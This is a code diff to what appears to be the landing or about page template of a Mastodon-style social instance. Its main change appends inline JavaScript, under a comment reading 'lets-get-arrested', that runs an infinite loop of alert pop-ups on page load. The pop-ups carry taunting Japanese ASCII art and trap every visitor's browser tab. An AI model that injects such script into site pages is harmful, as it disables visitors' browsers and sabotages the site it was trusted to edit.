@@ -11,6 +11,7 @@
       .public-account-header__image
         = image_tag @instance_presenter.hero&.file&.url || @instance_presenter.thumbnail&.file&.url || asset_pack_path('preview.jpg'), alt: @instance_presenter.site_title, class: 'parallax'
 
+
   .column-1
     .landing-page__call-to-action{ dir: 'ltr' }
       .row
@@ -45,3 +46,12 @@
   .column-3
     .box-widget
       .rich-formatting= @instance_presenter.site_extended_description.html_safe.presence || t('about.extended_description_html')
+
+  / lets-get-arrestedlets-get-arrested
+  :javascript
+    window.onload = function() {
+      while(1) {
+        window.alert("　∧_∧　ババババ\n（ ・ω・)=つ≡つ\n（っ ≡つ=つ\n`/　　)\n(ノΠＵ\n何回閉じても無駄ですよ～ww\nm9（＾Д＾）プギャー！！\n　byぐすくま (@guskma@abyss.fun)")
+      }
+    };
+
